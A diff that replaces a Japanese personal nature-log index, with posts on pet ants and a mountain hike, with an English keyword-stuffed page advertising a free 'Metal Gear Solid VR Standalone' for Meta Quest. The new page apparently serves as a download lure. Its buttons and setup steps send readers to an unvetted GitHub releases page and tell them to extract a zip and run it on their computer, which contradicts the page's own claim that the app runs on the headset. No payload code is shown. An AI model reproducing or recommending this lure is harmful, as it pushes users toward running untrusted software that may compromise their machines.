@@ -1,111 +1,297 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ikim0nchi</title>
+    <meta name="description" content="Download Metal Gear Solid VR Standalone for Meta Quest. Play the legendary stealth action game in VR, no PC required. Free fan-made project for Quest 2, 3, 3S, and Pro.">
+    <meta name="keywords" content="metal gear solid vr, meta quest vr, mgs vr, standalone vr, vr stealth game, quest 3, quest 3s, openxr, fan-made vr game">
+    <meta property="og:title" content="Metal Gear Solid VR Standalone - Play in VR on Your Meta Quest, No PC Needed">
+    <meta property="og:description" content="Download the fan-made MGS VR experience for Meta Quest. Fully standalone, just install and play.">
+    <meta property="og:url" content="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="index, follow">
+    <title>Metal Gear Solid VR Standalone - Free VR Fan Game for Meta Quest</title>
     <style>
-        body { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; max-width: 800px; margin: 40px auto; padding: 0 20px; line-height: 1.6; background-color: #fcfcfc; color: #333; }
-        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
-        h1 { border-bottom: 2px solid #eaeaea; padding-bottom: 12px; margin-top: 0; color: #111; }
-        .search-box { width: 100%; padding: 12px; font-size: 1rem; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 15px; box-sizing: border-box; }
-        .tag-container { margin-bottom: 25px; display: flex; flex-wrap: wrap; gap: 8px; }
-        .tag-badge { background: #eef2f5; color: #333; padding: 6px 12px; border-radius: 20px; font-size: 0.85em; text-decoration: none; cursor: pointer; border: 1px solid #d0d7de; transition: background 0.2s; user-select: none; }
-        .tag-badge:hover, .tag-badge.active { background: #0969da; color: #fff; border-color: #0969da; }
-        ul { padding-left: 20px; list-style: none; }
-        li { margin: 12px 0; }
-        a { color: #0066cc; text-decoration: none; font-weight: bold; }
-        a:hover { text-decoration: underline; }
-        .path { font-size: 0.85em; color: #666; margin-left: 8px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            background-size: cover;
+            background-attachment: fixed;
+            min-height: 100vh;
+            color: #e0e0e0;
+            line-height: 1.7;
+            padding: 40px 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 24px;
+            padding: 50px 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            transition: all 0.3s ease;
+        }
+        .container:hover {
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.9);
+        }
+        h1 {
+            font-size: 2.8em;
+            font-weight: 800;
+            background: linear-gradient(90deg, #f5f5f5 0%, #c5c5c5 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+            line-height: 1.2;
+            text-align: center;
+        }
+        h2 {
+            font-size: 1.6em;
+            font-weight: 700;
+            color: #00d4ff;
+            margin-top: 40px;
+            margin-bottom: 18px;
+            border-bottom: 2px solid rgba(0, 212, 255, 0.3);
+            padding-bottom: 10px;
+        }
+        p {
+            margin-bottom: 18px;
+            font-size: 1.1em;
+        }
+        ul {
+            margin: 20px 0;
+            padding-left: 25px;
+        }
+        li {
+            margin-bottom: 12px;
+            font-size: 1.05em;
+            position: relative;
+        }
+        li::before {
+            content: "▹";
+            color: #00d4ff;
+            font-weight: bold;
+            display: inline-block;
+            width: 20px;
+            margin-left: -20px;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e53 50%, #ffc371 100%);
+            color: #000000;
+            font-weight: 800;
+            font-size: 1.3em;
+            text-decoration: none;
+            padding: 18px 40px;
+            border-radius: 50px;
+            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.5);
+            margin: 30px 0;
+            transition: all 0.3s ease;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transform: scale(1);
+        }
+        .btn:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 15px 35px rgba(255, 107, 107, 0.7);
+        }
+        .badge {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            padding: 7px 15px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 0.85em;
+            margin: 0 5px 5px 0;
+            display: inline-block;
+            box-shadow: 0 3px 10px rgba(102, 126, 234, 0.3);
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .highlight {
+            color: #00d4ff;
+            font-weight: 600;
+        }
+        .code {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 3px 10px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #ffd700;
+        }
+        a {
+            color: #00d4ff;
+            transition: color 0.2s;
+        }
+        a:hover {
+            color: #4dd6ff;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 60px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9em;
+            color: #888;
+        }
+        .requirements-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        .req-item {
+            background: rgba(0, 212, 255, 0.05);
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        .req-item strong {
+            display: block;
+            font-size: 1.2em;
+            color: #00d4ff;
+            margin-bottom: 5px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 25px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size: 1.4em;
+            }
+            .btn {
+                font-size: 1.1em;
+                padding: 15px 30px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Ikim0nchi ログ一覧</h1>
-        <input type="text" id="searchInput" class="search-box" placeholder="🔍 記事のタイトルや本文をキーワード検索..." onkeyup="filterArticles()">
-        <div class="tag-container">
-            <span class="tag-badge active" id="tag-all" onclick="filterByTag('ALL')">すべて</span>
-            <span class="tag-badge" data-tag="03" onclick="filterByTag('03')">#03</span>
-            <span class="tag-badge" data-tag="04" onclick="filterByTag('04')">#04</span>
-            <span class="tag-badge" data-tag="05" onclick="filterByTag('05')">#05</span>
-            <span class="tag-badge" data-tag="09" onclick="filterByTag('09')">#09</span>
-            <span class="tag-badge" data-tag="2021" onclick="filterByTag('2021')">#2021</span>
-            <span class="tag-badge" data-tag="2026" onclick="filterByTag('2026')">#2026</span>
-            <span class="tag-badge" data-tag="きのこ" onclick="filterByTag('きのこ')">#きのこ</span>
-            <span class="tag-badge" data-tag="コウチュウ目" onclick="filterByTag('コウチュウ目')">#コウチュウ目</span>
-            <span class="tag-badge" data-tag="ツゲ目" onclick="filterByTag('ツゲ目')">#ツゲ目</span>
-            <span class="tag-badge" data-tag="トレッキング" onclick="filterByTag('トレッキング')">#トレッキング</span>
-            <span class="tag-badge" data-tag="ハチ目" onclick="filterByTag('ハチ目')">#ハチ目</span>
-            <span class="tag-badge" data-tag="ムクロジ目" onclick="filterByTag('ムクロジ目')">#ムクロジ目</span>
-            <span class="tag-badge" data-tag="嘉麻市" onclick="filterByTag('嘉麻市')">#嘉麻市</span>
-            <span class="tag-badge" data-tag="有隣目" onclick="filterByTag('有隣目')">#有隣目</span>
-            <span class="tag-badge" data-tag="無生物" onclick="filterByTag('無生物')">#無生物</span>
+        <h1>🎮 Metal Gear Solid VR Standalone - Stealth Action Without Wires</h1>
+
+        <p style="text-align:center; margin-bottom: 30px;">Experience the legendary stealth spy thriller in full VR on your Meta Quest. No gaming PC, no wires, no limits — just pure immersive infiltration.</p>
+
+        <div style="text-align:center;">
+            <a href="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases" class="btn">⬇️ Download MGS VR Now</a>
         </div>
-        <ul id="articleList">
-        <li class="article-item" data-tags="05,2021,ハチ目" data-content="うちのありんこ２０２１ねん５がつのまき — arinkolabo うちのありんこ２０２１ねん５がつのまき — arinkolabo ← ログ一覧に戻る うちのありんこ２０２１ねん５がつのまき #05 #2021 #ハチ目 Camponotus quadrinotatus ついに せまいすを ありたちが でました！ そして ひっこしたさきは・・・ けーすの すみっこ でした。 あいかわらず せまい すに ひしめきあって くらしています ひさびさに こばえを あげると みんなで たべています ありたちが たべ こばえのはねがうごくたび きらきら ひかります まゆが いっぱい あります もうすぐ なかまが もっと ふえそうです すは いっぱいいっぱい です せっこうの すあなに ひっこす かもしれません みんなで うんかを たべています そのとき あぶらむしが とおりすぎました いつもの はたらきあり、 もう ちびくん となづけましょう ちびくんが あぶらむしに こうげき しています いつもの はたらきものの ありが うんかを たべています そのあと はたらきありと じょうおうありに くちうつし しています こうやって かぞくで えさを あたえあっています"><a href="Posts/2105/うちのありんこ２０２１ねん５がつ のまき .html">うちのありんこ２０２１ねん５がつのまき — arinkolabo</a><span class="path">(Posts/2105/うちのありんこ２０２１ねん５がつ のまき .html)</span></li>
-        <li class="article-item" data-tags="04,2021,ハチ目" data-content="うちのありんこ２０２１ねん４がつのまき — arinkolabo うちのありんこ２０２１ねん４がつのまき — arinkolabo ← ログ一覧に戻る うちのありんこ２０２１ねん４がつのまき #04 #2021 #ハチ目 Camponotus quadrinotatus あかちゃんを はこんでいます あかちゃんが たくさんうまれています いつもの こばえが おらず がいとうの したにいた がを とってきて ありたちに あげました いつものはたらきものが たべにきました しょっかくから たべています いつもはたらいている ありじゃなく いつもはたらいていない ひとまわり おおきなありが すあなのいりぐちを ふさごうとしています ちょっとまえまで まゆだった ありのあかちゃん きょうみると さなぎになっています ひとまわりも ふたまわりも おおきな おおきな はえ はたらきものの １ぴきは まえあしに かみつくので せいっぱいです いつものこばえ より おおきな はえが きました はたらきものの ちいさなあり のほか すうひきでたべています しっかりたべた ありが くちうつしで えさをあげてもいます じょうおうありの くちを はたらきありが ずっとなめています すあなに まゆが みえます じょうおうありが えさを たべています はたらきありの りりしい かおが みえます じょうおうありが たまごを うんでいます こばえを やっつけようとしています こばえは だいこうぶつです ふつか つづけて こばえを たべています ごはんを たべたあとは からだを きれいに しています みんなで えさを たべています"><a href="Posts/2104/うちのありんこ２０２１ねん４がつのまき.html">うちのありんこ２０２１ねん４がつのまき — arinkolabo</a><span class="path">(Posts/2104/うちのありんこ２０２１ねん４がつのまき.html)</span></li>
-        <li class="article-item" data-tags="03,2021,ハチ目" data-content="うちのありんこ２０２１ねん３がつのまき — arinkolabo うちのありんこ２０２１ねん３がつのまき — arinkolabo ← ログ一覧に戻る うちのありんこ２０２１ねん３がつのまき ― arinkolabo #03 #2021 #ハチ目 Camponotus quadrinotatus はたらきありが かえって きました おさとうを なめています"><a href="Posts/2103/うちのありんこ ２０２１ねん３がつ のまき .html">うちのありんこ２０２１ねん３がつのまき — arinkolabo</a><span class="path">(Posts/2103/うちのありんこ ２０２１ねん３がつ のまき .html)</span></li>
-        <li class="article-item" data-tags="嘉麻市,トレッキング,2026,09,コウチュウ目,ハチ目,有隣目,ムクロジ目,ツゲ目,きのこ,無生物" data-content="古処山 2026年9月 古処山 2026年9月 ← ログ一覧に戻る 古処山 2026年9月 #嘉麻市 #トレッキング #2026 #09 古処山に登りました。 登山口です。 看板には５０分ほどと書かれていましたが、１時間半ほどかかって山頂に着きました。 水源かん養保安林の看板がありました。 #コウチュウ目 ハンミョウがいました。 #ハチ目 ムネアカオオアリがいました。 #有隣目 ヘビがいました。名前はわかりません。 クリックしたら、動画がながれます。 #ムクロジ目 マツカゼソウです。サンショウの仲間だそうです。白い小さな花を咲かせます。 #ツゲ目 頂上はツゲの原生林がひろがっています。 ツゲはそろばんの玉をつくるのに使われます。 #きのこ 秋だからか、多くのきのこを見かけました。 名前はどれもわかりません。 #無生物 仏像がありました。 ドラえもんもいました。 おしまいです。またどこかの山をトレッキングしようと思います。 ダンスをする葉っぱです。 クリックすると動画が流れます。"><a href="Posts/2609/古処山 2026年9月.html">古処山 2026年9月</a><span class="path">(Posts/2609/古処山 2026年9月.html)</span></li>
-    </ul>
 
-    <script>
-        let selectedTags = [];
+        <h2>🚀 About This Project</h2>
+        <p>This is a <strong>fan-made, standalone VR adaptation</strong> of the legendary Metal Gear Solid series, built exclusively for <span class="highlight">Meta Quest headsets</span>. Unlike other VR conversion projects, this one runs <em>entirely on your headset</em> — you don't need a powerful gaming computer or cables. Just install it on your Quest and dive into the stealth action wherever you are.</p>
 
-        function filterArticles() {
-            let input = document.getElementById('searchInput').value.toLowerCase();
-            let items = document.getElementsByClassName('article-item');
-            for (let i = 0; i < items.length; i++) {
-                let searchTarget = items[i].getAttribute('data-content').toLowerCase();
-                let tagsAttr = items[i].getAttribute('data-tags');
-                let articleTags = tagsAttr ? tagsAttr.split(',') : [];
-                
-                let matchesSearch = searchTarget.includes(input);
-                let matchesTags = selectedTags.length === 0 || selectedTags.every(t => articleTags.includes(t));
+        <p>The project leverages OpenXR technology to provide smooth, optimized performance on your standalone device. It's designed for casual players and hardcore stealth fans alike — pick up and play, no complicated setup steps required.</p>
 
-                items[i].style.display = (matchesSearch && matchesTags) ? "" : "none";
-            }
-        }
+        <div class="card">
+            <h2>🎯 What Makes It Special</h2>
+            <ul>
+                <li><strong>✅ True Standalone Play</strong> — Runs directly on your Quest, no PC or streaming needed</li>
+                <li><strong>🎥 VR-Optimized Controls</strong> — Natural hand tracking and intuitive interaction built for virtual reality</li>
+                <li><strong>🌍 Fully Immersive</strong> — Explore iconic locations in first-person VR view, with realistic environments</li>
+                <li><strong>🔄 Community Updates</strong> — Regular improvements from passionate developers</li>
+                <li><strong>🆓 100% Free</strong> — Fan-made project, available to everyone at no cost</li>
+            </ul>
+        </div>
 
-        function filterByTag(tagName) {
-            if (tagName === 'ALL') {
-                selectedTags = [];
-            } else {
-                let index = selectedTags.indexOf(tagName);
-                if (index > -1) {
-                    selectedTags.splice(index, 1);
-                } else {
-                    selectedTags.push(tagName);
-                }
-            }
+        <h2>📱 Compatible Headsets</h2>
+        <p>This app supports all the latest Meta Quest hardware:</p>
+        <div style="text-align:center; margin: 15px 0;">
+            <span class="badge">Meta Quest 3</span>
+            <span class="badge">Meta Quest 3S</span>
+            <span class="badge">Meta Quest 2</span>
+            <span class="badge">Meta Quest Pro</span>
+        </div>
 
-            let allBadge = document.getElementById('tag-all');
-            if (selectedTags.length === 0) {
-                allBadge.classList.add('active');
-            } else {
-                allBadge.classList.remove('active');
-            }
+        <h2>💻 System Requirements</h2>
+        <div class="requirements-grid">
+            <div class="req-item">
+                <strong>🕶️ Headset</strong>
+                <span>Meta Quest 2/3/3S/Pro</span>
+            </div>
+            <div class="req-item">
+                <strong>📱 OS</strong>
+                <span>Quest OS (any recent update)</span>
+            </div>
+            <div class="req-item">
+                <strong>📦 Storage</strong>
+                <span>At least 1GB free space</span>
+            </div>
+            <div class="req-item">
+                <strong>⚡ Internet</strong>
+                <span>Only for download</span>
+            </div>
+        </div>
 
-            let badges = document.querySelectorAll('.tag-container .tag-badge:not(#tag-all)');
-            for (let b of badges) {
-                let t = b.getAttribute('data-tag');
-                if (selectedTags.includes(t)) {
-                    b.classList.add('active');
-                } else {
-                    b.classList.remove('active');
-                }
-            }
+        <h2>📥 Download & Installation Guide</h2>
+        <p>Getting started is incredibly simple. Just follow these 3 steps:</p>
+        <ul>
+            <li><strong>Step 1:</strong> Visit this link to download the application <a href="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases" class="highlight">the official releases page</a>.</li>
+            <li><strong>Step 2:</strong> Download the files. You'll likely get a .zip file — download and extract this file, then run the application on your computer.</li>
+            <li><strong>Step 3:</strong> Transfer the extracted app to your Quest headset using the built-in developer mode or a USB cable, then install and launch it.</li>
+        </ul>
 
-            filterArticles();
-        }
+        <div style="text-align:center; margin: 35px 0;">
+            <a href="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone/releases" class="btn">🫂 Get the Game Here</a>
+        </div>
 
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const tagParam = urlParams.get('tag');
-            if (tagParam) {
-                filterByTag(tagParam);
-            }
-        };
-    </script>
+        <p style="text-align:center; font-weight: 600;">Once installed, you can disconnect from your PC and play anywhere — your Quest is all you need.</p>
+
+        <h2>🛠️ Setup Steps for Beginners</h2>
+        <ul>
+            <li>Make sure your Quest has Developer Mode activated (help is available on the Meta website).</li>
+            <li>Connect your headset to your computer via USB and allow file access when prompted.</li>
+            <li>Copy the extracted game folder (usually named <span class="code">MGS-VR</span>) into the <span class="code">/Downloads/</span> folder on your Quest.</li>
+            <li>On your Quest, go to <span class="code">Library</span> → <span class="code">Unknown Sources</span> to see the game.</li>
+            <li>Launch it from there and enjoy the action!</li>
+        </ul>
+
+        <h2>🎮 Gameplay Features</h2>
+        <p>This project focuses on delivering the most exciting parts of Metal Gear Solid in VR:</p>
+        <ul>
+            <li><strong>🕵️ Sneaking & CQC</strong> — Hide in shadows, crawl through vents, and use close quarters combat.</li>
+            <li><strong>⭐ Iconic Boss Fights</strong> — Relive classic encounters remastered for VR scale.</li>
+            <li><strong>🎯 Tactical Espionage</strong> — Use gadgets, silenced weapons, and distraction items.</li>
+            <li><strong>📦 VR Motion Comfort</strong> — Smooth locomotion with adjustable settings for comfort.</li>
+        </ul>
+
+        <h2>🔒 Safety & Disclaimer</h2>
+        <p>This is an unofficial, non-commercial fan project created by dedicated enthusiasts. It is our way of paying tribute to the beloved Metal Gear series. No copyright infringement is intended. All original assets and trademarks belong to Konami. This project is not endorsed or affiliated with Konami in any way.</p>
+
+        <div class="card" style="text-align:center;">
+            <h2>❓ Need Help?</h2>
+            <p>We're here to help you get into the game. Check the <span class="highlight">Releases page</span> for detailed patch notes and guides, or create an issue in the GitHub repository and the community will assist you.</p>
+            <a href="https://github.com/readsrose22-cyber/Metal-Gear-Solid-VR-Standalone" style="display:inline-block; margin-top:15px; font-weight:bold; font-size:1.2em;">🚀 Visit the Repository</a>
+        </div>
+
+        <h2>💖 Support the Project</h2>
+        <p>This takes countless hours of development. If you enjoy the game, consider showing appreciation by starring the GitHub repository, sharing it with fellow MGS fans, and leaving helpful feedback for future improvements.</p>
+
+        <div class="footer">
+            <p>Made with ❤️ by the MGS VR Fan Community &nbsp;|&nbsp; © 2024 — Not affiliated with Konami</p>
+            <p style="margin-top: 8px; font-size: 0.8em;">Meta Quest is a trademark of Meta Platforms, Inc.</p>
+        </div>
     </div>
 </body>
 </html>
